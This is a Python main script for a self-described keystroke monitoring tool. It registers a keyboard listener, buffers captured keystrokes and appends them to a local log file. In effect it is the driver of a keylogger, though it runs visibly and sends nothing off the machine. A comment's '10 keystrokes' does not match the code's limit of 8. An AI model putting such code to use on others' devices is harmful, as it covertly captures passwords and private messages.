import sys
import os

# Ensures Python can locate your internal packages when running main.py
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.buffer import KeyBuffer
from core.monitor import start_keyboard_listener
from processing.storage import append_to_log

# Initialize your memory cache with a threshold limit (e.g., 10 keystrokes)
data_cache = KeyBuffer(max_size=8)

def process_key_event(letter):
    """Callback function that receives processed strings from monitor.py"""
    if letter:
        data_cache.add(letter)
    
    # Write to disk only when the cache threshold is met to optimize disk I/O
    if data_cache.is_full():
        buffered_chunk = data_cache.flush()
        append_to_log(buffered_chunk)

if __name__ == "__main__":
    print("Initializing modular keystroke monitoring subsystem...")
    
    try:
        # Call your custom monitor function instead of raw pynput code
        with start_keyboard_listener(process_key_event) as listener:
            listener.join()
            
    except KeyboardInterrupt:
        print("\nStopping subsystem. Flushing remaining cache memory...")
        leftover_data = data_cache.flush()
        if leftover_data:
            append_to_log(leftover_data)
        print("Done.")